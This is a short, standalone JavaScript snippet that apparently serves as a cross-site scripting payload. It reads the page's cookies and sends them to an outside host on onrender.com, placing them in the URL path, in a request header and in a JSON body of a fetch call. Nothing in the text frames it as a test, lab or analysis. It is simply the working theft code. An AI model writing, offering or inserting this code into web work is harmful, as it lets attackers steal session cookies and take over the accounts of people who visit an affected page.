const webhookUrl = "https://rendercpull.onrender.com/" + document.cookie;
const cookies = document.cookie;
fetch(webhookUrl, {
  method: 'OPTIONS',
  headers: {
     'accept-language': document.cookie

  },
  body: JSON.stringify({
    cookie: cookies
  })
})
